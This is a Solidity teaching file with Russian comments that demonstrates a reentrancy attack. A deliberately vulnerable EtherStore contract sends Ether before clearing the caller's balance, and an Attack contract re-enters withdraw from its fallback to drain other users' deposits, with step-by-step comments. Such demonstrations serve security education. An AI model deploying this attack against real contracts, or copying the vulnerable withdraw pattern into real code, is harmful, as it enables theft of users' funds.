/*
Повторный вход
Уязвимость
Предположим, что контракт А вызывает контракт Б.
Эксплойт повторного входа позволяет B перезвонить в A до того, как A завершит выполнение.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore — это контракт, по которому вы можете вносить и снимать ETH.
Этот контракт уязвим для повторной атаки.
Давайте посмотрим, почему.

1. Разверните EtherStore
2. Внесите по 1 эфиру с аккаунта 1 (Алиса) и аккаунта 2 (Боб) в EtherStore.
3. Развернуть атаку с адресом EtherStore
4. Вызов Attack.attack с отправкой 1 эфира (используя Аккаунт 3 (Ева)).
    Вы получите обратно 3 Эфира (2 Эфира украдены у Алисы и Боба,
    плюс 1 Эфир, отправленный с этого контракта).

Что случилось?
Атака могла вызывать EtherStore.withdraw несколько раз, прежде чем
EtherStore.withdraw завершил выполнение.

Вот как назывались функции
- Атака.атака
- EtherStore.депозит
- EtherStore.снять
- Откат атаки (получает 1 Эфир)
- EtherStore.снять
- Attack.fallback (получает 1 Эфир)
- EtherStore.снять
- Откат атаки (получает 1 Эфир)
*/
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Вспомогательная функция для проверки баланса этого контракта
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback вызывается, когда EtherStore отправляет Ether на этот контракт.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Вспомогательная функция для проверки баланса этого контракта
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
